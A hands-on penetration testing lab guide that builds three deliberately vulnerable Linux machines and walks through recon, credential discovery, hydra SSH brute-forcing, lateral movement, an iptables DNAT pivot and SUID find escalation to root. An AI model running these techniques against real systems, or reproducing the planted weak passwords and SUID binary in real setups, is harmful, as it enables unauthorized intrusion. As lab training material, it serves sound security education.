# Lab 1: Penetration Testing Foundations

## Objective

Start with zero knowledge of the network. Discover targets, enumerate services, find credentials, move laterally across machines, bypass firewall restrictions, and escalate privileges to read a flag on the final target.

## Skills Practiced

- nmap host discovery and service scanning
- FTP anonymous access enumeration
- Web directory enumeration
- Credential discovery and reuse
- SSH lateral movement
- iptables port forwarding (DNAT + masquerade)
- SUID binary privilege escalation

## Network Diagram

```
YOUR MACHINE                   COMPANY NETWORK

Kali (attacker)          Debian (web server - DMZ)
192.168.244.129    →     192.168.244.132
                              │
                         CentOS (internal app server)
                         192.168.244.131
                              │
                         Ubuntu (database server - the prize)
                         192.168.244.130
```

**Goal:** Get root on Ubuntu and read `/root/flag.txt`.

---

## Setup

### Debian (web server — 192.168.244.132)

```bash
# Install services
sudo apt update
sudo apt install apache2 openssh-server vsftpd -y

# Start services
sudo systemctl enable --now apache2
sudo systemctl enable --now ssh
sudo systemctl enable --now vsftpd

# Create a user with a weak password
sudo useradd -m -s /bin/bash webdev
echo "webdev:dragon" | sudo chpasswd

# Create a hidden credentials file the developer left behind
sudo mkdir -p /var/www/html/backup
echo "Internal Server Credentials" | sudo tee /var/www/html/backup/creds.txt
echo "CentOS App Server: admin / Sup3rS3cret!" | sudo tee -a /var/www/html/backup/creds.txt
echo "Server IP: 192.168.244.131" | sudo tee -a /var/www/html/backup/creds.txt

# Make backup directory listable
sudo chmod 755 /var/www/html/backup

# Create a custom index page
echo "<h1>Company Web Portal</h1><p>Welcome to our secure server.</p>" | sudo tee /var/www/html/index.html

# Enable FTP anonymous login
sudo nano /etc/vsftpd.conf
# Set: anonymous_enable=YES, local_enable=YES, write_enable=YES

# Put a hint in the FTP directory
echo "Note to self: SSH is running on this server" | sudo tee /srv/ftp/readme.txt
echo "Dev team credentials are in the web backup folder" | sudo tee -a /srv/ftp/readme.txt

sudo systemctl restart vsftpd

# Open firewall
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
```

### CentOS (internal app server — 192.168.244.131)

```bash
# Disable firewalld, use raw iptables
sudo systemctl stop firewalld
sudo systemctl disable firewalld
sudo dnf install iptables-services -y

# Install and enable SSH
sudo systemctl enable --now sshd

# Create admin user matching the creds on the web server
sudo useradd -m -s /bin/bash admin
echo "admin:Sup3rS3cret!" | sudo chpasswd
sudo usermod -aG wheel admin

# Create breadcrumb file with next target's info
sudo mkdir -p /home/admin/notes
echo "Ubuntu DB Server: 192.168.244.130" | sudo tee /home/admin/notes/servers.txt
echo "DB User: dbadmin" | sudo tee -a /home/admin/notes/servers.txt
echo "DB Pass: Pr0dP@ssw0rd" | sudo tee -a /home/admin/notes/servers.txt
sudo chown -R admin:admin /home/admin/notes

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf

# iptables — block reverse SSH tunnels to Kali
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j DROP

# Allow established, SSH in, drop the rest
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT

# Log dropped traffic
sudo iptables -A INPUT -j LOG --log-prefix "CENTOS-DROPPED: " --log-level 4

sudo service iptables save
```

### Ubuntu (database server — 192.168.244.130)

```bash
# Install services
sudo apt update
sudo apt install openssh-server mysql-server -y

sudo systemctl enable --now ssh
sudo systemctl enable --now mysql

# Create dbadmin user
sudo useradd -m -s /bin/bash dbadmin
echo "dbadmin:Pr0dP@ssw0rd" | sudo chpasswd
sudo usermod -aG sudo dbadmin

# Create the flag
echo "FLAG{you_completed_the_full_attack_chain}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# Create a SUID binary for privilege escalation
sudo cp /usr/bin/find /usr/local/bin/find
sudo chmod u+s /usr/local/bin/find

# Firewall — only accept SSH from CentOS
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.244.131 -j ACCEPT
sudo iptables -A INPUT -j LOG --log-prefix "UBUNTU-DROPPED: " --log-level 4
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

### Add ICMP rules if ping is needed

On CentOS and Ubuntu:

```bash
sudo iptables -I INPUT 3 -p icmp -j ACCEPT
```

---

## Attack Walkthrough

### Phase 1: Reconnaissance

**What you're doing:** Finding live hosts and discovering what services they run.

```bash
# Discover live hosts
nmap -sn 192.168.244.0/24

# Scan Debian
nmap -sV -sC 192.168.244.132 -oN debian_scan.txt

# Scan CentOS
nmap -sV -sC 192.168.244.131 -oN centos_scan.txt

# Scan Ubuntu
nmap -sV -sC 192.168.244.130 -oN ubuntu_scan.txt
```

**Expected results:**
- Debian: FTP (21), SSH (22), HTTP (80)
- CentOS: SSH (22)
- Ubuntu: SSH filtered/blocked from Kali

### Phase 2: Enumeration

**What you're doing:** Digging deeper into each service to find useful information.

#### Check FTP for anonymous access

```bash
ftp 192.168.244.132
# Username: anonymous
# Password: (press Enter)
ftp> ls
ftp> get readme.txt
ftp> bye
cat readme.txt
```

**You find:** A note about SSH access and credentials in the web backup folder.

#### Enumerate the web server

```bash
# Check the main page
curl http://192.168.244.132

# Scan for hidden directories
dirb http://192.168.244.132

# Check the backup directory (found via FTP hint or dirb)
curl http://192.168.244.132/backup/creds.txt
```

**You find:** CentOS credentials — `admin / Sup3rS3cret!`

#### Alternative: brute force SSH

```bash
hydra -l webdev -P /usr/share/wordlists/rockyou.txt ssh://192.168.244.132 -t 4 -f
```

### Phase 3: Initial Access

**What you're doing:** Using discovered credentials to get a shell on Debian.

```bash
ssh webdev@192.168.244.132
# Password: dragon

# Enumerate from inside
whoami
id
ls /var/www/html/backup/
cat /var/www/html/backup/creds.txt
```

### Phase 4: Lateral Movement

**What you're doing:** Using credentials found on Debian to access CentOS.

```bash
# From Debian
ssh admin@192.168.244.131
# Password: Sup3rS3cret!

# Enumerate CentOS
whoami
id
sudo -l
cat /home/admin/notes/servers.txt
```

**You find:** Ubuntu credentials — `dbadmin / Pr0dP@ssw0rd`

### Phase 5: The SSH Reverse Tunnel Problem

**What you're doing:** Attempting to tunnel back to Kali — and understanding why it fails.

```bash
# From CentOS — try reverse tunnel to Kali
ssh -R 9050 kali_user@192.168.244.129
# FAILS — blocked by iptables

# Check why
sudo iptables -L OUTPUT -n -v
# Shows: DROP rule for TCP port 22 to 192.168.244.129
```

**Lesson:** Egress filtering blocks reverse tunnels. Need another approach.

### Phase 6: iptables Port Forwarding

**What you're doing:** Using iptables on CentOS to forward traffic to Ubuntu since reverse tunnels are blocked.

```bash
# On CentOS — set up port forwarding
sudo iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.244.130:22
sudo iptables -A FORWARD -p tcp -d 192.168.244.130 --dport 22 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -p tcp -d 192.168.244.130 --dport 22 -j MASQUERADE
```

| Rule | What it does |
|---|---|
| PREROUTING DNAT | Traffic hitting CentOS:2222 gets rewritten to Ubuntu:22 |
| FORWARD ACCEPT | Allow the rewritten traffic to pass through |
| POSTROUTING MASQUERADE | Rewrite source IP so Ubuntu sees traffic from CentOS (allowed through its firewall) |

```bash
# From Debian — SSH to Ubuntu through CentOS's port forward
ssh dbadmin@192.168.244.131 -p 2222
# Password: Pr0dP@ssw0rd
```

### Phase 7: Privilege Escalation

**What you're doing:** Escalating from dbadmin to root on Ubuntu.

```bash
# Enumerate for privesc
whoami
id
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/find — this is NOT normal

# Exploit SUID find (check GTFOBins for the technique)
/usr/local/bin/find . -exec /bin/bash -p \;

# Verify
whoami
# root

# Capture the flag
cat /root/flag.txt
# FLAG{you_completed_the_full_attack_chain}
```

---

## Attack Chain Summary

```
Phase 1: Recon         → nmap finds FTP, SSH, HTTP on Debian
Phase 2: Enumeration   → FTP note → web backup → CentOS credentials
Phase 3: Initial Access → SSH to Debian as webdev
Phase 4: Lateral Move  → SSH to CentOS with found creds → find Ubuntu creds
Phase 5: Tunnel Blocked → Reverse SSH fails (egress iptables)
Phase 6: iptables Pivot → DNAT port forward through CentOS to Ubuntu
Phase 7: Priv Esc      → SUID find binary → root → flag
```

## Cleanup

```bash
# Debian
sudo userdel -r webdev
sudo rm -rf /var/www/html/backup
sudo iptables -F

# CentOS
sudo userdel -r admin
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -P INPUT ACCEPT

# Ubuntu
sudo userdel -r dbadmin
sudo rm /usr/local/bin/find
sudo rm /root/flag.txt
sudo iptables -F
sudo iptables -P INPUT ACCEPT
```
